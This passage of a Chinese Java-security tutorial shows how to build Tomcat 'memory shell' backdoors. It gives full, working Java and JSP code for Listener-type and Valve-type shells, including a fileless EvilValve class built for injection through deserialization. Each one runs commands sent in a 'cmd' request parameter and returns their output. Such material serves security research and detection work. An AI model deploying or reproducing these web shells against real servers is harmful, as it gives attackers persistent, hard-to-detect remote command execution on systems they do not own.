            addlistener.invoke(standardContext,servletRequestListener);
        } catch (Exception hi) {
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }
    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        try{
            RequestFacade requestfacade= (RequestFacade) servletRequestEvent.getServletRequest();
            Field field = requestfacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(requestfacade);
            Response response = request.getResponse();
            if (request.getParameter("cmd") != null){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
                String output = scanner.hasNext() ? scanner.next() : "";
                response.getOutputStream().write(output.getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
                return;
            }
        }catch(Exception ig){
            ig.printStackTrace();
        }
    }
}
```

参考：
[Tomcat-Listener型内存马](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/)
[Tomcat 内存马（二）：Listener 内存马](http://wjlshare.com/archives/1651)

### Valve
>Tomcat 在处理一个请求调用逻辑时，是如何处理和传递 Request 和 Respone 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，Tomcat 使用了职责链模式来实现客户端请求的处理。在 Tomcat 中定义了两个接口：Pipeline（管道）和 Valve（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门
>整个调用过程是通过Pipeline-Valve管道进行的 ，Pipeline中有`addValve`方法，维护了Valve链表，Valve可以插入到Pipeline中，对请求做某些处理，Pipeline中是没有invoke方法的，因为整个调用链的触发是Valve来完成的，Valve完成自己的处理后，调用`getNext().invoke()`来触发下一个Valve调用

借用一张图说明：
![](https://img-blog.csdnimg.cn/10045e62b456430a8a6d5c427c96d2ac.png)

每个容器都有一个Pipeline对象，只要触发了这个Pipeline的第一个Valve，这个容器里的Pipeline中的Valve都会被调用到，其中，Pipeline中的`getBasic`方法获取的Valve处于Valve链的末端，它是Pipeline中必不可少的一个Valve， 负责调用下层容器的Pipeline里的第一个Valve 

#### 流程分析
Tomcat 中 Pipeline 仅有一个实现类`StandardPipeline`，存放在 ContainerBase 的 pipeline 属性中
![](https://img-blog.csdnimg.cn/2794af514db7482b87738b6a3e4703b8.png)
并且 ContainerBase 提供 addValve 方法调用 StandardPipeline 的 addValve 方法添加
四大组件`Engine/Host/Context/Wrapper`都有自己的Pipeline，在ContainerBase容器基类定义了，因此只要获取四大组件之一调用add方法即可添加
![](https://img-blog.csdnimg.cn/3b3540d460ca462a85f6d2ca5b311fdc.png)
看到在 `org.apache.catalina.connector.CoyoteAdapter` 的 service 方法中调用 Valve 的 invoke 方法
![](https://img-blog.csdnimg.cn/9be4737cf2274f0d963810338fb02282.png)
在invoke方法中我们能拿到request和response
>这里我们只要自己写一个 Valve 的实现类，为了方便也可以直接使用 ValveBase 实现类。里面的 invoke 方法加入我们的恶意代码，由于可以拿到 Request 和 Response 方法，所以也可以做一些参数上的处理或者回显。然后使用 StandardContext 中的 pipeline 属性的 addValve 方法进行注册

#### jsp内存马

反射获取四大组件，然后调用addValve方法添加恶意Valve，之后发起请求即可触发

**Valve内存马实现步骤：**
1. 获取StandardContext
2. 继承并编写一个恶意Valve
3. 调用standardContext.getPipeline().addValve()添加恶意valve实例


```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
    try {
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        ValveBase valve = new ValveBase() {
            @Override
            public void invoke(Request request, Response response){
                try{
                    String cmd = request.getParameter("cmd");
                    if(cmd != null){
                        boolean isLinux = true;
                        String osTyp = System.getProperty("os.name");
                        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                            isLinux = false;
                        }
                        String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\a");
                        String output = s.hasNext() ? s.next() : "";
                        PrintWriter out = response.getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    }
                    this.getNext().invoke(request, response);
                }catch(Exception e){
                }

            }
        };
        standardContext.getPipeline().addValve(valve);
        response.getWriter().write("Success");
    } catch (Exception e) {
        e.printStackTrace();
    }
%>
```
![](https://img-blog.csdnimg.cn/616cb09d8ce64b538d28a2b359644015.png)

#### 无文件内存马
网上全是继承`ValveBase`类，但是如果是反序列化要满足TemplatesImpl的加载，需要继承AbstractTranslet，但又不能继承多个类，那么就需要使用接口了
```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import java.io.InputStream;
import java.io.PrintWriter;
import java.util.Scanner;

public class EvilValve extends AbstractTranslet implements Valve {
    protected Valve next;
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            standardContext.getPipeline().addValve(new EvilValve());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public void backgroundProcess() {
    }

    @Override
    public void invoke(Request request, Response response) {
        try {
            String cmd = request.getParameter("cmd");
            if (cmd != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                PrintWriter out = response.getWriter();
                out.println(output);
                out.flush();
                out.close();
            }
            this.getNext().invoke(request, response);
        } catch (Exception e) {
        }
    }

    @Override
    public boolean isAsyncSupported() {
        return false;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
```

参考：
[Tomcat-Valve型内存马](https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Valve%E5%9E%8B/)
[Tomcat容器攻防笔记之Valve内存马出世](https://www.anquanke.com/post/id/225870)
[Tomcat之Valve内存马](https://p1n93r.github.io/post/security/tomcat%E4%B9%8Bvalve%E5%86%85%E5%AD%98%E9%A9%AC/)
[『Java安全』Tomcat内存马_动态注册Valve内存马_管道Pipeline内存马](https://blog.csdn.net/Xxy605/article/details/124120724)

**Tomcat内存马可参考文章：**
[https://github.com/ce-automne/TomcatMemShell](https://github.com/ce-automne/TomcatMemShell)
[深入浅出内存马（一） ](https://www.anquanke.com/post/id/262562)
[JSP内存马研究](https://xz.aliyun.com/t/10372)
[Tomcat 内存马分析及检测](https://myzxcg.com/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B)
[JSP Webshell那些事 -- 攻击篇(下)](https://zhuanlan.zhihu.com/p/187303019)
[Java内存马攻防实战--攻击基础篇](https://mp.weixin.qq.com/s/HODFJF3NJmsDW2Lcd-ebIg)
[JavaWeb 内存马一周目通关攻略](https://su18.org/post/memory-shell/)
